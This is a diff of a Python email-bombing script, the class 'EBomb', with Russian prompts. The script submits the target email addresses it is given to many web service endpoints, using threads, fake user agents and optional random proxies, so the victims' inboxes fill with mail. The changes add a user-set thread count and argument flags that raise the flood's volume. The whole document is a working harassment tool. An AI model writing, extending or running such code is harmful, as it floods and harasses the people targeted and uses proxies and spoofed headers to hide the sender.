@@ -1,6 +1,7 @@
 # Imports:
 
-from sys import argv
+from sys import argv, stderr
+from os import _exit
 from random import choice
 from threading import Thread
 from urllib import request
@@ -14,7 +15,9 @@ from fake_useragent import UserAgent  # pip install fake_useragent
 
 
 class EBomb:
-    def __init__(self, Emails=None, WPx=None):
+
+    def __init__(self, Emails=None, WPx=None, Threads=None):
+
         if not Emails:
             self.Emails = self.Get_Emails()
         else:
@@ -23,13 +26,16 @@ class EBomb:
             self.WPx = self.With_Proxies()
         else:
             self.WPx = WPx
+        if not Threads:
+            self.Threads = self.Get_Threads()
+        else:
+            self.Threads = Threads
+
         self.Make_Threads()
 
-
     def Make_Threads(self):
-        for _ in range(5):
+        for _ in range(self.Threads):
             Thread(target=self.Send_Email).start()
-    
 
     def Send_Email(self):
         if self.WPx:
@@ -44,17 +50,19 @@ class EBomb:
                 proxyT = ""
                 if self.WPx:
                     type_ = serv[:len("https")].replace(":", "")
-                    req = request.Request(serv %(email), headers=header,)
+                    req = request.Request(serv % (email), headers=header,)
                     try:
                         proxy = choice(proxies)
+                    except KeyboardInterrupt:
+                        _exit(0)
                     except Exception as Error:
                         print(Error)
                         quit(1)
                     req.set_proxy(proxy, type_)
                     proxyT = f"С IP: {proxy}"
-                
+
                 try:
-                    req = request.Request(serv %(email), headers=header)
+                    req = request.Request(serv % (email), headers=header)
                     resp = request.urlopen(req)
                     res = resp.status
                 except Exception as Error:
@@ -62,9 +70,15 @@ class EBomb:
                 print(f"На {email} {proxyT} | От {serv} | {res}")
 
     def With_Proxies(self):
-        Use = input("Использовать прокси? [Д/н] ")
+        Use = input("Использовать прокси? [Д/н] ").strip()
         return self.Y_n(Use)
 
+    def Get_Threads(self):
+        try:
+            Count = int(input("Сколько использовать потоков (2): ").strip())
+        except:
+            Count = 2
+        return Count
 
     def Y_n(self, Use):
         Use = str(Use).lower()
@@ -96,18 +110,26 @@ class EBomb:
         )
         return Terms
 
-
     def Get_Emails(self):
-        Entry = input("Введите почты (Через пробелы): ").split()
+        Entry = input("Введите почты (Через пробелы): ").strip().split()
         return Entry
 
+
 kw = {}
+
 if len(argv) >= 2:
+
     if "-x" in argv:
         kw["WPx"] = True
+        argv.remove("-x")
+    if "-T" in argv:
+        try:
+            kw["Threads"] = int(argv[argv.index("-T")+1])
+        except Exception as Error:
+            stderr.write(str(Error))
+        argv.remove("-T")
+
     if "-a" in argv:
         kw["Emails"] = argv[argv.index("-a")+1:]
-        if "-x" in argv:
-            kw["Emails"].remove("-x")
 
 EBomb(**kw)
